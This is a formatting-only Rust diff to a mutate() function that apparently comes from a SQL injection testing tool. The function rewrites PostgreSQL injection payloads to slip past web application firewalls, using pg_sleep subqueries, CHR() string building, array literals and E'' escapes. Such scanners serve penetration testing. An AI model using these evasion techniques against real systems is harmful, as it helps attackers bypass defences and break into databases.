@@ -53,7 +53,11 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
         results.push(payload.replace("SLEEP(", "pg_sleep("));
         results.push(payload.replace("sleep(", "pg_sleep("));
         // Subquery variant — harder for WAFs to regex
-        results.push(payload.replace("SLEEP(", "(SELECT pg_sleep(").replace(")", "))"));
+        results.push(
+            payload
+                .replace("SLEEP(", "(SELECT pg_sleep(")
+                .replace(")", "))"),
+        );
     }
 
     // ── GENERATE_SERIES for row expansion ──
@@ -64,22 +68,23 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
     // ── CHR() string building ──
     // Build strings from CHR() calls — no keywords visible
     if let Some(start) = payload.find('\'')
-        && let Some(end) = payload[start + 1..].find('\'') {
-            let inner = &payload[start + 1..start + 1 + end];
-            if !inner.is_empty() && inner.len() <= 15 {
-                let chr_chain: String = inner
-                    .chars()
-                    .map(|c| format!("CHR({})", c as u32))
-                    .collect::<Vec<_>>()
-                    .join("||");
-                results.push(format!(
-                    "{}{}{}",
-                    &payload[..start],
-                    chr_chain,
-                    &payload[start + 1 + end + 1..]
-                ));
-            }
+        && let Some(end) = payload[start + 1..].find('\'')
+    {
+        let inner = &payload[start + 1..start + 1 + end];
+        if !inner.is_empty() && inner.len() <= 15 {
+            let chr_chain: String = inner
+                .chars()
+                .map(|c| format!("CHR({})", c as u32))
+                .collect::<Vec<_>>()
+                .join("||");
+            results.push(format!(
+                "{}{}{}",
+                &payload[..start],
+                chr_chain,
+                &payload[start + 1 + end + 1..]
+            ));
         }
+    }
 
     // ── Array literal injection ──
     if results.len() < max_mutations {
@@ -109,11 +114,12 @@ pub fn mutate(payload: &str, max_mutations: usize) -> Vec<String> {
 
     // ── E'escape' string syntax ──
     if let Some(start) = payload.find('\'')
-        && results.len() < max_mutations {
-            let mut escaped = payload.to_string();
-            escaped.insert(start, 'E');
-            results.push(escaped);
-        }
+        && results.len() < max_mutations
+    {
+        let mut escaped = payload.to_string();
+        escaped.insert(start, 'E');
+        results.push(escaped);
+    }
 
     results.truncate(max_mutations);
     results
